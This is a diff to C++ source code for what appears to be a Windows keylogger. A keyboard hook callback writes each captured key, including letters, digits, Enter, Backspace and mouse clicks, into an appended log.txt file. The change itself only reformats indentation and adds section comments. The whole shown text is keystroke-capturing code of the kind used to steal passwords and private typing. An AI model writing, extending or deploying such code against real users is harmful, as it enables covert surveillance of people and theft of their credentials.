@@ -39,42 +39,38 @@ ofstream myfile("log.txt", std::ios::app);
         {
             switch( pKeyBoard->vkCode ) 
             {
-            	
-            case VK_TAB:
-            	myfile<<"\n Tab \n";
-            break;
-			case VK_CONTROL:
-            	myfile<<"Ctrl";
-            break;
-            case VK_RETURN: 
-                myfile<<"\n Enter  \n"; 
-            break;
-//button
-			case VK_XBUTTON1:
-				myfile<<"XBUTTON";
-			break;
-			case VK_LBUTTON:
-				myfile<<"\n Click \n";
-			break;
-//button	
-			case VK_SPACE:
-				myfile<<"\n";
-			break;
-			case VK_DECIMAL:
-				myfile<<".";
-			break;
-			case VK_BACK:
-				myfile<<"\n Backspace \n";
-			break;
-				
+//Buttons	
+            	case VK_TAB:
+            		myfile<<"\n Tab \n";
+            	break;
+				case VK_CONTROL:
+            		myfile<<"Ctrl";
+            	break;
+            	case VK_RETURN: 
+                	myfile<<"\n Enter  \n"; 
+           		break;
+				case VK_XBUTTON1:
+					myfile<<"XBUTTON";
+				break;
+				case VK_LBUTTON:
+					myfile<<"\n Click \n";
+				break;	
+				case VK_SPACE:
+					myfile<<"\n";
+				break;
+				case VK_DECIMAL:
+					myfile<<".";
+				break;
+				case VK_BACK:
+					myfile<<"\n Backspace \n";
+				break;
+//Letters & Numbers
                    case 0x41:
                 myfile<<"A";
                 break;
-
                     case 0x42:
                 myfile<<"B";
                 break;  
-
                     case 0x43:
                 myfile<<"C";
                 break;
@@ -108,99 +104,75 @@ ofstream myfile("log.txt", std::ios::app);
                     case 0x4D:
                 myfile<<"M";
                 break;
-
                     case 0x4E:
                 myfile<<"N";
                 break;
-
                     case 0x4F:
                 myfile<<"O";
                 break;
-
                     case 0x50:
                 myfile<<"P";
                 break;
                     case 0x51:
                 myfile<<"Q";
                 break;
-
                     case 0x52:
                 myfile<<"R";
                 break;
-
-                                case 0x53:
+                    case 0x53:
                 myfile<<"S";
                 break;
-                                case 0x54:
+                    case 0x54:
                 myfile<<"T";
                 break;
-
-                                case 0x55:
+                    case 0x55:
                 myfile<<"U";
                 break;
-                                case 0x56:
+                    case 0x56:
                 myfile<<"V";
                 break;
-                                case 0x57:
+                    case 0x57:
                 myfile<<"W";
                 break;
-                                case 0x58:
+                    case 0x58:
                 myfile<<"X";
-                break;          case 0x59:
+                break;          
+					case 0x59:
                 myfile<<"Y";
                 break;
-                                case 0x5A:
+                    case 0x5A:
                 myfile<<"Z";
                 break;
-
-
-                case 0x30:
+                	case 0x30:
                 myfile<<"0 \n";
                 break;  
-
-                case 0x31:
+                	case 0x31:
                 myfile<<"1 \n"; 
                 break;
-
-
-                case 0x32:
+                	case 0x32:
                 myfile<<"2 \n"; 
                 break;
-
-
-                case 0x33:
+                	case 0x33:
                 myfile<<"3 \n"; 
                 break;
-
-
-                case 0x34:
+                	case 0x34:
                 myfile<<"4 \n"; 
                 break;
-
-
-                case 0x35:
+                	case 0x35:
                 myfile<<"5 \n"; 
                 break;
-
-
-                case 0x36:
+                	case 0x36:
                 myfile<<"6 \n"; 
                 break;  
-
-
-                case 0x37:
+              	    case 0x37:
                 myfile<<"7 \n"; 
                 break;  
-
-
-                case 0x38:
+                	case 0x38:
                 myfile<<"8 \n"; 
                 break;
-
-                case 0x39:
-                    myfile<<"9 \n";
-
-                    break;
+                	case 0x39:
+                myfile<<"9 \n";
+				break;
             }
         }
     default:
